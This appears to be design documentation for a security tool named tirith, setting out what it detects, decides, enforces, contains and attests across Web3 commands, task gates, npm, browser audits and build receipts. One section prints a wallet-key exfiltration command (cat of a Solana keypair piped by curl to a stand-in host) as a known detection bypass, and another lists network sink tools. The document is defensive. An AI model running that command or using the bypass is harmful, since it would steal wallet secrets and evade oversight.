# Enforcement coverage

This document is the honest ledger for the Web3 and untrusted-task execution
boundary. It exists because "tirith supports X" is not a single claim: seeing a
thing, deciding about it before it happens, stopping it, limiting it once it
runs, and recording that it was true once are five different capabilities, and
this stack delivers different amounts of each.

It is a companion to, not a replacement for, the generated
[capability matrix](capability-matrix.md). That file answers "what does this
command inspect". This one answers "what can tirith actually do about it".

## How to read the columns

| Column | The question it answers |
|---|---|
| **Detection** | Can tirith see this at all, on some surface? |
| **Preflight decision** | Does tirith produce a decision (a verdict, an action, a task decision) *before* the thing happens? |
| **Execution enforcement** | Can tirith prevent the thing from executing? |
| **Containment** | Can tirith limit what it does while it runs? |
| **Attestation** | Is there a signed, content-addressed record of what was true at one moment? |
| **Unsupported** | The platform or backend where the row above is simply not available. |

Cells are **Full**, **Partial**, or **None**. Two rules govern the wording.

**"Partial" in the execution-enforcement column always means the same thing.**
Enforcement exists only where tirith owns the transition, or where a shell hook
it installed is in a blocking mode. It does not exist for a non-interactive
shell, a direct `exec`, a program that links `tirith-core` and calls it as a
library, or an agent process that never loaded the hook. `TIRITH=0` bypasses the
gate unless `allow_bypass_env: false` is set, and a root or admin user bypasses
tirith trivially. Nothing in this stack changes that; see
[threat model](threat-model.md).

**"None" is never softened into "planned".** A None cell means the capability is
absent from this branch, not that it is coming.

## The matrix

### Web3 command guard

| Capability | Detection | Preflight decision | Execution enforcement | Containment | Attestation | Unsupported |
|---|---|---|---|---|---|---|
| Web3 command grammar (Cast, Forge, Hardhat, Solana, Anchor) | Full for the declared grammar | Full | Partial | None | None | `forge create` has no grammar arm; a configured guard handles its gap through `action_incomplete_analysis`, while the empty default guard does not enable that policy action |
| On-chain write / signer / endpoint findings | Full | Full | Partial | None | None | none |
| `web3_guard` trusted policy | Partial (bounded grammar and static context) | Full for resolved policy facts | Partial | None | None | Incomplete analysis and unbound external execution remain explicit; required exact cards may be unavailable |
| Wallet, key, seed, and keystore recognition | Full for the declared formats | Full | Partial | None | None (recognition drives mandatory redaction, which is not an attestation) | none |
| Wallet source-to-sink exfiltration | Partial | Partial | Partial | None | None | see the nested-body gap below |
| Exact Web3 command-card bindings | Partial | Partial (required cards are enforced) | Partial | None | Partial (signed binding, not execution evidence) | Unbound executable identity, incomplete facts and unavailable artifact execution rechecks refuse approval; schema-1 cards cannot authorize Web3 |

### Untrusted task boundary

| Capability | Detection | Preflight decision | Execution enforcement | Containment | Attestation | Unsupported |
|---|---|---|---|---|---|---|
| Task envelope, source provenance, capability decision | Full | Full | None (the decision by itself stops nothing) | None | Partial (content-bound provenance receipts, verified not issued) | none |
| `tirith task check` and the `tirith_check_task` MCP tool | Full | Full | None (both declare `observe_only`) | None | None | MCP tool is refused unless `TIRITH_MCP_PREVIEW=1` |
| Task gate at tirith-owned transitions | Full | Full | Partial, and **inert by default** | Partial (a denied effect tightens the capsule spec) | Partial (an audit-chain line at the gateway-forward boundary only; no separate receipt) | the other eight owned boundaries write no record in any mode |

### Supply chain

| Capability | Detection | Preflight decision | Execution enforcement | Containment | Attestation | Unsupported |
|---|---|---|---|---|---|---|
| npm command grammar and registry identity facts | Full for the declared grammar | Full | Partial | None | None | no tarball bytes are ever fetched, hashed, or bound |
| npm signature and provenance receipt | Partial (npm's own answer, parsed) | None (explicit command, not a gate) | None | None | Full for the receipt document | Windows (`npm.cmd` is refused); npm outside the contract table; a project `.npmrc` that reconfigures the audit |
| GitHub Actions artifact flow | Full for the modelled surface | Full | None (a scanner finding, not a gate) | None | None | only directory scans run the post-pass: `tirith check` on one file, `tirith_scan_file`, and the LSP do not |

### Untrusted projects and browsers

| Capability | Detection | Preflight decision | Execution enforcement | Containment | Attestation | Unsupported |
|---|---|---|---|---|---|---|
| `capsule run --preset untrusted-project` | Full (project tree digest) | Full | Full (refuses before any copy or spawn) | Full where the backend delivers it | Partial (content-addressed always; anchored only when an audit chain is configured; signed only when an audit key exists) | everything except x86_64 Linux with a usable Landlock ABI; domain allow-listing is unavailable in every backend; `TIRITH_LOG=0` leaves the receipt unanchored |
| Chromium extension integrity audit | Full for the extension source tree | None (explicit command, not a gate) | None | None | Partial (content-addressed baseline, **not** anchored in the audit chain) | Firefox and XPI are refused by name; Chrome's `Secure Preferences` MAC is not verified |

### Point-in-time evidence

| Capability | Detection | Preflight decision | Execution enforcement | Containment | Attestation | Unsupported |
|---|---|---|---|---|---|---|
| Build receipt (`attest build` / `verify-build`) | Full for the two named trees | None | None | None | Full, point-in-time only | never anchored in the audit chain |
| Deployment receipt (`attest deployment` / `verify-deployment`) | Full for the routes actually fetched | None | None | None | Full, point-in-time only | one HTTPS origin; a cross-origin redirect is a mismatch, not a follow |

### Supporting engine work

| Capability | Detection | Preflight decision | Execution enforcement | Containment | Attestation | Unsupported |
|---|---|---|---|---|---|---|
| Byte-based content dispatch and global output bounds | Full | Full | Partial | None | None | nested and self-extracting archive content is a declared gap |
| PDF hidden-instruction and confirmation-suppression analysis | Partial | Full | Partial | None | None | unsupported colour spaces and renderer cases record incompleteness |
| ThreatDB publication correctness | Full for the compiled sources | Full | Partial | None | Partial (the database is signed and sequence-ordered) | no new feed and no new database format is enabled by this branch |

## Why each cell says what it says

### Web3 command grammar

`crates/tirith-core/src/rules/web3/` parses Cast, Forge, Hardhat, Solana, and
Anchor invocations into typed facts. It runs from
`crates/tirith-core/src/engine.rs:3067`, so every surface built on the engine
(`tirith check`, the shell hook, `tirith_check_command`, the gateway) sees it.

Detection is **Full for the declared grammar** and nothing wider. `forge create`,
the canonical Foundry deploy command, has no grammar arm: it yields an Unknown
operation with an `AmbiguousSubcommand` gap.

The gap remains in the parse result. A non-default `web3_guard` applies
`action_incomplete_analysis` to incomplete facts; where no facts are available,
the shared `analysis_incomplete` finding carries the configured action. An empty
default guard does not enable this additional policy decision, so default-policy
silence is not evidence of complete coverage. `tirith task check` separately
reports incomplete inferred effects. See the [Web3 guide](security/web3-command-guard.md)
for the current field and command-card limits.

### On-chain write, signer, and endpoint findings

Three rule ids, all in `crates/tirith-core/src/rules/web3_gate.rs`:
`web3_state_changing_command`, `web3_signer_risk`, and
`web3_network_policy_violation`.

The severity ladder is grammar-driven, not heuristic
(`web3_gate.rs:185-231`, `234-283`): a state-changing operation is Medium,
rising to High only when the same command also disables a declared safety
control (`--skip-simulation`, `--skip-preflight`, `--force`); literal raw signer
material in argv is Critical; an unlocked node or an interactive prompt is High.
An operation explicitly aimed at `devnet`, `testnet`, `localhost`, `localnet`,
or a loopback endpoint produces no state-change finding at all
(`web3_gate.rs:129-171`), because deploying to devnet is routine and warning on
it is how a control gets ignored.

Evidence is categorical. A finding names the tool, the operation, and the signer
KIND. It never carries a key, a keystore path, a destination address, or the raw
command.

**This is grammar and policy, not chain analysis.** Nothing here reads chain
state, simulates a transaction, resolves an ENS name, scores an address, or
inspects a contract. An address is a string tirith deliberately keeps out of its
own output.

### `web3_guard` trusted policy

`crates/tirith-core/src/web3_policy.rs`. The whole section is built around one
invariant: a repository may tighten, never authorize. Grant-bearing collections
(networks, selector aliases, allowed signers, approval key ids) are RESET when
they arrive from a repository-scoped policy; denial collections UNION; actions
and modes take the stricter value on a total lattice. A property test proves
`allowed_effects(merge(trusted, hostile_repo))` is always a subset of
`allowed_effects(trusted)`.

The defaults are observational (`web3_policy.rs:236-253`): no networks, no
signers, no denials, and every action at `warn`. With no trusted networks
declared, the unclassified-endpoint path does not fire at all
(`web3_gate.rs:315`), so a fresh installation gains no new warnings from this
section.

An endpoint no trusted network claims is reported through
`action_unclassified_rpc` and says in so many words that it is "not a claim that
the host is malicious". Treating an unrecognised host as hostile would train
operators to ignore the rule.

The current engine also reads destination denials, selector aliases,
incomplete-analysis and ambiguous-Hardhat actions, and required command cards.
The approval path restricts signing keys through `command_card_key_ids` and
requires exact semantic bindings. Destination/signer restrictions do not depend
on successfully classifying an RPC network. A resolved denied destination blocks;
an unresolved one follows the incomplete-analysis action. Trusted production
Hardhat script runs use their configured action.

These checks are reachable in `web3_gate::decide` / `apply_policy`, `evaluate_rpc`
and the engine's Web3 card path. The [field table](security/web3-command-guard.md#policy-fields-and-current-limits)
describes the current behavior without implying a generally usable external-tool
approval backend. Repository grant-bearing fields remain neutralized.

### Wallet, key, seed, and keystore recognition

`crates/tirith-core/src/sensitive_assets.rs` is the single catalogue: reviewed
wallet paths, keystore shapes, browser-wallet storage roots, Solana keypair
arrays, BIP-39 mnemonics with real checksum validation, EVM scalars, and hosted
RPC credentials.

The attestation column is **None**, and the distinction matters: recognition
produces no signed record that a secret was present, and it should not, because
such a record would itself be a secret-adjacent artifact.

What recognition DOES drive is mandatory redaction, which is a different
property from attestation. It runs before and after layout and control
sanitization and before truncation, across findings, evidence, verdicts, the
audit chain, session state, execution state, SARIF, and every CLI, MCP, gateway,
and manual renderer. A private PATH is redacted by a separate mechanism from a
secret VALUE, because a path is not a secret byte string and value-based
redaction cannot see it: a BIP-39 mnemonic in a command was scrubbed correctly
while `~/.config/Exodus/exodus.wallet` in the same command was not, until path
redaction was added at the shared entry point that evidence, the audit log, and
`last_trigger.json` all pass through.

### Wallet source-to-sink exfiltration

Detection is **Partial**, deliberately, and the gap is specific.

What works: a proven read of a reviewed sensitive source flowing to a proven
remote sink, across ordered same-command segments, including archive, base64,
hex, compressor, and encryptor staging hops, `xargs` and `find -exec` operand
promotion, HTTPie and `xh`, `scp`, `rsync`, `rclone`, the netcat family,
`socat`, PowerShell `Invoke-WebRequest` / `Invoke-RestMethod`, and DNS sinks. A
source-only read stays below confirmed exfiltration; an unresolvable path fails
closed as `analysis_incomplete` rather than as a confident allow.

What does not work, verified on the built binary at this branch tip:

```
bash -c "cat ~/.config/solana/id.json" | curl --data-binary @- https://collector.invalid/upload
```

is a confident **allow**. The nested body IS analyzed, so the same chain
entirely inside `-c` blocks correctly, and the same chain entirely outside `-c`
blocks correctly. What escapes is the sink-outside / producer-inside
arrangement: the inner body's read provenance is not propagated to the outer
pipeline's dataflow. Related unprobed shapes are `xargs -a <file>`,
`parallel -a <file>`, and `while read` loops. Fixing this needs nested-body read
provenance threaded through the dataflow loop, which is a behaviour change and
therefore a future slice, not a documentation slice.

### Exact Web3 command-card bindings

The engine calls `command_card_approves_web3`, which requires verified signature
and expiry, a policy-authorized signing key, exact semantic comparison and
recheckable artifact evidence. `require_command_card` blocks an unmatched
state-changing operation. The code is reachable; this is not an inert policy
field.

Current external executable identity and artifact recheck limits still refuse
exact approval. The CLI derivation path reports these limits during `create`
or `sign`; it does not invent weaker approval. A signed card or a passing unit
test is not proof of native execution enforcement. New schema-3 cards bind a
command digest and shell instead of retaining raw command text; legacy
verification and explicit migration have separate contracts. See
[Web3 command cards](security/web3-command-guard.md#command-cards-for-web3-operations)
for signer privacy and exact binding requirements.

### Task envelope, provenance, and the capability decision

`crates/tirith-core/src/task.rs`. Three rules shape it, and each is checkable in
the code rather than asserted here.

The caller does not get to say where content came from. `claimed_source` is
recorded as a claim; effective provenance is assigned by the tirith-owned
ingress adapter. `SourceKind::is_trusted` is unconditionally `false`
(`task.rs:71-73`) for every source kind including repository config, because
repository config is exactly what a malicious pull request edits.

Verified live at this branch tip: an envelope whose source claims `agent_config`,
submitted through the `github-issue` adapter, resolves to
`"effective_source": "issue_body"`.

Operations define their effects, not their descriptions. Natural language infers
nothing at all: a `narrative` action records that something unmodelled was asked
for and contributes no effect.

Nothing grants. `decide` intersects the trusted gate policy, source eligibility,
and boundary support. A verified receipt can fail to lift a restriction; it can
never exceed the trusted policy.

Assessment is deterministic and side-effect free: `task.rs` contains zero
filesystem, network, and clock calls, and the clock is caller-supplied.

### `tirith task check` and the preview MCP tool

Both are diagnostic. They report what an envelope WOULD be allowed to do and
declare `BoundaryCapability::ObserveOnly`, so the limit is structural and
visible in their own output rather than only in prose. Execution enforcement is
**None** for both, and that is the correct value: a report is not a gate.

The MCP tool is preview-gated. `tirith_check_task` is absent from the frozen
default `tools/list` and is refused BY NAME unless `TIRITH_MCP_PREVIEW=1` is set
(`crates/tirith-core/src/mcp/tools.rs:174-181`, `332-335`). See
[compatibility](compatibility.md) for why the default list cannot simply grow a
tool.

### Task gate at tirith-owned transitions

`crates/tirith-core/src/task_boundary.rs` defines nine owned boundaries
(`task_boundary.rs:118-130`) and is called at ten sites:

| Boundary token | Where |
|---|---|
| `gateway_forward` | before the MCP gateway registers a pending request and writes upstream |
| `package_approval` | before `tirith pkg approve` runs the resolver |
| `package_resolve` | before `tirith pkg install` runs the same resolver network |
| `package_install_preparation` | before the target environment is checkpointed |
| `package_manager_network` | before `tirith install <manager>` contacts a registry |
| `package_manager_execution` | before the package manager is spawned |
| `remote_script_run` | before `tirith run <url>` and `tirith install url <URL>` download and launch |
| `config_write` | before a tirith-owned config file is published by rename |
| `capsule_preset_run` | before `capsule run --preset untrusted-project` copies or spawns |

Four properties, each pinned by a test. Enforcement keys on the MODE, never on
the denial set, so an operator who filled in effect sets without choosing a mode
does not accidentally get live enforcement. Observe mode never raises a verdict
to `Warn`, because the gateway converts `Warn` into a hard deny when
`warn_action` is `deny`. Each gate precedes its own irreversible step, proven by
running each integration test twice: once with the gate off to show the boundary
is reachable, once enforcing to show the same evidence is gone. And the default
ships inert: `TaskGateMode` defaults to `Off` and an `Off` gate does not even
write an audit line.

**Only one of the nine boundaries records anything, in any mode.**
`BoundaryAssessment::is_recordable()` (`task_boundary.rs:203`) has exactly one
production caller, `crates/tirith/src/cli/gateway.rs:3214`, and
`write_task_boundary_audit` is defined and called only there
(`gateway.rs:4227` and `:3215`). The `gateway_forward` boundary writes an
audit-chain line in observe and enforce modes; the other eight decide, refuse or
allow, and write nothing anywhere. An observation burn-in run against
`pkg approve` under `mode: observe` produces no audit file at all.

This matters for anyone planning a burn-in: eight of the nine boundaries cannot
be measured from records, so "no records" means "not instrumented", never "not
exercised". Instrumenting them is a behaviour change and therefore a future
slice, not a documentation slice.

The containment cell is **Partial** because a denied effect narrows the capsule
spec rather than merely refusing: `network_egress` forces deny-all networking,
`filesystem_write` clears the write roots, and `resource_escalation` clamps every
resource ceiling to the shared conservative values. It only ever tightens, which
`tightening_the_untrusted_project_preset_never_widens_it` pins.

**The trap an operator must know about, stated precisely.** Effect inference
models the Web3 shell grammar and nothing else, so nearly every ordinary SHELL
command is reported INCOMPLETE. `action_incomplete_analysis` only applies when
`!decision.complete` (`crates/tirith-core/src/task_boundary.rs:325-330`), so
`block` bites at exactly the five boundaries that submit a shell envelope:
`capsule_preset_run` (`capsule_run.rs:255`), `gateway_forward`
(`gateway.rs:3202`), `remote_script_run` (`run.rs:68` for `tirith run <url>`
and `install.rs:3154` for `tirith install url <URL>`), and
`package_manager_network` plus `package_manager_execution`, which share the
`evaluate_install_boundary` helper at `install.rs:1765`.

It never fires at the other four. `ProposedAction::PackageInstall` and
`ProposedAction::ConfigWrite` leave `complete = true`
(`crates/tirith-core/src/task.rs:638-652`), so `tirith pkg approve`, the
`pkg install` resolve and prepare stages, and every tirith-owned config write
assess as complete and are unaffected by this setting. A one-action
`package_install` envelope returns `"complete": true`; a `config_write` envelope
returns `"complete": true`; `{"shell":{"command":"pip install requests"}}`
returns `"complete": false`.

So `block` is not "refuses everything". It is "refuses unmodelled shell at five
of the nine owned boundaries, and changes nothing at the other four". Whether
that trade is worth making is an operator decision, not a foregone one. The
conservative default remains `warn`, and
`effects_denied_for_untrusted_sources` is the blunter and more predictable
control, but read the next paragraph before reaching for it.

**`effects_denied_for_untrusted_sources` is an unconditional denial of the
effect, not a denial scoped to agent-supplied content.** The name reads as
though it discriminates by origin. At these boundaries it cannot.
`SourceKind::is_trusted` returns `false` for every kind
(`crates/tirith-core/src/task.rs:71-73`), and every owned boundary attributes
its operation to `IngressAdapter::Unattributed` (`cli/mod.rs:665`,
`cli/pkg.rs:651`, `cli/gateway.rs:3207`, `cli/capsule_run.rs:259`,
`cli/run.rs:72`, `cli/install.rs:1769` and `:3158`), which is the truthful
answer because an argv is just an argv. `allowed_effects`
(`crates/tirith-core/src/web3_policy.rs:451`) therefore filters that effect out
on every call, including the operator's own typed commands.

Under `mode: enforce` with
`effects_denied_for_untrusted_sources: [policy_change, package_install]`,
`tirith pkg approve pip requests` refuses with "task gate denied these effects at
this boundary: package_install", and `tirith policy init` refuses with "task gate
refused this configuration write: task gate denied these effects at this
boundary: policy_change". The same policy under `mode: observe` allows both, so
the mode is the only variable. Price that cost before enabling it; it is a real
control, and it is broader than its name suggests.

### npm command grammar and registry identity facts

`crates/tirith-core/src/npm_command.rs` is one grammar replacing four divergent
private copies. It covers the `npm`, `npx`, `pnpm`, `yarn`, `bun`, and `bunx`
launchers (`npm_command.rs:81-108`), including `dlx`, `exec`, `ci`, and the
common install misspellings, and it distinguishes `pnpm exec` (local binary)
from `pnpm dlx` (fetch and run).

`corepack` is not modelled. The token appears nowhere in `npm_command.rs` or in
the tier-1 pattern table, so a `corepack pnpm@x dlx <pkg>` invocation is not
recognised as a package operation. That is a coverage gap, recorded rather than
claimed either way.

`crates/tirith-core/src/provenance/npm_facts.rs` parses what a packument SAYS:
the tarball URL, the `dist.integrity` SRI, the legacy `dist.shasum`, the
signature list, and the attestation pointer. Every one of those is a FACT, never
a verification, and the enum makes that structural:
`NpmVerificationState::Verified` has no constructor in this crate and a unit test
asserts it. npm signs with ECDSA P-256 and this workspace carries only
`ed25519-dalek`; the Sigstore closure the attestations would need is off because
it requires a newer Rust than the workspace MSRV.

**Tirith does not download, inspect, or bind the tarball bytes npm installs.**
There is nothing local for the SRI to cover, so no binding is attempted. This is
not an npm firewall and this branch does not build toward one: there is no npm
quarantine, no npm install transaction, and no npm rollback.

### npm signature and provenance receipt

`tirith pkg attest-npm` resolves npm through the trusted-child mechanism (no
shell, so an alias cannot hijack the name), discovers its exact version, and
looks that version up in a CLOSED, fixture-backed contract table. The table has
exactly one entry, because exactly one fixture was captured from a real npm
rather than extrapolated.

Detection is **Partial** because the answer is npm's, parsed, not tirith's. The
one binding tirith performs itself is comparing an attestation's in-toto subject
digest against the `integrity` SRI the project's own `package-lock.json` pins;
those cover the same tarball bytes, so a disagreement means the attestation is
over different bytes than the lockfile will install.

Two consequences an operator meets in practice. A non-public registry is
`partial` rather than clean, because npm ships the Sigstore TUF root that pins
only `registry.npmjs.org`. And a project `.npmrc` that sets a key deciding what
npm verifies or where it verifies it from (`registry`, `ca`, `cafile`,
`strict-ssl`, `_keys`, `omit`, `userconfig`, `globalconfig`) returns `partial`
and runs NO audit command: the audited project does not get to configure its own
audit.

### GitHub Actions artifact flow

`crates/tirith-core/src/rules/workflow_artifacts.rs`. A repository post-pass, not
a per-file rule, because no single workflow file can prove a producer-to-consumer
chain. A `WorkflowArtifactPoisoning` High requires the full proven chain:
fork-reachable untrusted producer, artifact under a statically known name,
privileged `workflow_run` consumer bound to the TRIGGERING run, matching
artifact identity, and an execute, source, PATH-mutation, publish, or deploy
sink. Anything less is recorded as incompleteness, never guessed.

The presence-level `WorkflowRunTrigger` finding is downgraded from High to
Medium only for consumers the post-pass had COMPLETE visibility into and proved
no chain for.

The post-pass runs inside `scan::scan` (`crates/tirith-core/src/scan.rs:254`,
invoking it at `:436`), so it runs on **every** directory-scan caller, not only
the CLI. Those callers are `tirith scan` (`crates/tirith/src/cli/scan.rs:248`),
the `tirith_scan_directory` MCP tool
(`crates/tirith-core/src/mcp/tools.rs:742`), and both MCP scan resources
(`crates/tirith-core/src/mcp/resources.rs:153` and `:244`). An agent gating on
`tirith_scan_directory` therefore sees the same downgraded Medium and the same
`WorkflowArtifactPoisoning` chain findings the CLI produces, and does not need
to re-run the CLI to get them.

What genuinely never runs the post-pass, and therefore keeps the original
severity, is per-file analysis: `tirith check` on a single workflow file, the
`tirith_scan_file` MCP tool (`mcp/tools.rs:657`, via
`scan_single_file_guarded`), and the LSP.

Execution enforcement is **None**. This is a scanner finding. It can gate a
merge through CI exit codes if an operator wires it that way; tirith does not
stop a workflow from running.

### `capsule run --preset untrusted-project`

The one row in this document with **Full** execution enforcement, and it earns it
by refusing rather than by containing more.

`required_coverage` was not weakened
(`crates/tirith-core/src/capsule/mod.rs:858-874`), so the preset is genuinely
enforceable only on x86_64 Linux with a usable Landlock ABI. Raw-network denial
needs seccomp, which is x86_64 Linux only in this build; macOS cannot enforce a
per-process memory ceiling or a process-count ceiling at all; and the
parent-owned wall-clock and combined-output supervisor is Linux-only.

Verified live on the macOS development host at this branch tip: the command
refuses before anything is copied or spawned, exits 1, writes a refusal receipt,
reports `project_copy_materialized: false`, and names the exact missing control
("missing: resource_limits ... the parent-owned wall-clock and combined-output
supervisor this preset requires is implemented only on Linux").

Attestation is **Partial**, and the reason is the anchoring condition. The
receipt is always content-addressed and always written, including for a refusal.
It is ed25519-signed only when the installation has an audit signing key, and it
is anchored in the audit hash chain only when an audit chain is CONFIGURED. With
the documented `TIRITH_LOG=0` set, the same command prints

```
receipt is unsigned (no audit signing key configured) and NOT anchored in the audit chain
```

where an installation with the log enabled prints `... and anchored in the audit
chain`. An anchor SKIP is deliberately not a failure and does not downgrade the
exit code (`crates/tirith/src/cli/capsule_run.rs:913-925`), so a caller that
reads only the exit status cannot detect it. Read the printed line, or check the
chain, before treating a capsule receipt as tamper-evident.

**Domain allow-listing is unavailable in every backend.**
`domain_proxy_enforced` is `false` in the Linux, macOS, and Windows backends and
in `NoOpCapsule`, and a coverage ledger may not claim domain egress without raw
socket denial. An allow-list preset would therefore fail closed on every host
while implying a capability the product does not have, so the preset offers
deny-all only. Dependencies must be vendored or installed by a separate trusted
transaction.

### Chromium extension integrity audit

`tirith browser audit` for Chrome, Chromium, Brave, and Edge. Explicit,
one-shot, read-only: it never removes, quarantines, or watches anything. Firefox
and XPI are refused by name.

Attestation is **Partial** for one reason stated rather than implied: the
baseline is ed25519-signed when the installation has an audit key, but it is
**not anchored in the audit hash chain**. The chain's receipt anchors are typed
per receipt kind and mint their trust capability by re-reading a receipt from a
tirith-owned directory under a `0600` owner contract, and a baseline written to
an operator-chosen path cannot satisfy that constructor.

A second limit, also stated rather than implied: **Chrome's `Secure Preferences`
MAC is not verified.** Three install-class fields are read from it, and their
values are used for classification; the file's own integrity signature is not
checked, so a local attacker who can rewrite that file can change the reported
install class.

**This is not browser forensics.** Cookies, history, saved passwords, Local
Storage, IndexedDB, extension storage, wallet databases, and `Local State` are
never opened. Because `Local State` is never opened, the audit cannot tell an
operator which human a profile belongs to; profile identity is the profile
directory name and nothing else. There is no monitor, no daemon, and no
collection.

### Build and deployment receipts

`tirith attest build` records the exact bytes of two named trees at one moment,
plus the commit, dirty state, lockfile digests, policy projection hash, a
redacted argv digest, and the identity of the one external tool tirith itself
ran.

**It is not a reproducible-build claim.** Tirith does not run the build, does
not observe the compiler, and cannot say the output was produced from the
source. Two receipts over the same source with different outputs are both
perfectly valid receipts. Every rendering surface and the receipt's own
`caveats` field say so, and `validate` refuses a receipt that dropped the
caveats.

`tirith attest deployment` proves one thing: at the timestamp it records, the
routes it listed returned the byte sequences the build receipt bound. It is not
continuous monitoring, it says nothing about routes it did not fetch, and a CDN
can serve different bytes to the next client, in another region, a second later.
`verify-deployment` re-checks the DOCUMENT and deliberately does not re-fetch,
because a second measurement presented as verification of the first would be
exactly the continuous-monitoring claim this work refuses to make.

Neither receipt is anchored in the audit hash chain, for the same
operator-chosen-path reason as the browser baseline. `BuildCoverage::audit_chain_anchored`
is always `false` and `validate` refuses a receipt that claims otherwise.

## What this branch does not do

Named explicitly so no reader has to infer it from silence.

- **No on-chain analysis.** No chain state is read, no transaction is simulated,
  no mempool is watched, no address or contract is scored, and no incident is
  attributed on-chain.
- **No npm artifact firewall.** No npm tarball is downloaded, extracted,
  quarantined, hashed, or bound. There is no npm install transaction and no npm
  rollback. The existing artifact firewall remains Python-only.
- **No browser forensics.** No browsing data is read, no browser is monitored,
  nothing is quarantined or removed, and no infostealer is attributed.
- **No reproducible builds.** No receipt in this branch claims that an output
  was produced from a source, and none can.
- **No universal enforcement.** Enforcement exists at nine tirith-owned
  transitions and in a shell hook that must be installed, interactive, and in a
  blocking mode. Everything else is detection, preflight, or evidence.
- **No new live feed, and no new database format.** No Polkadot, MISP,
  PhishTank, ScamSniffer, or Chainabuse channel is activated, and no ThreatDB v3
  asset exists to shadow v2.
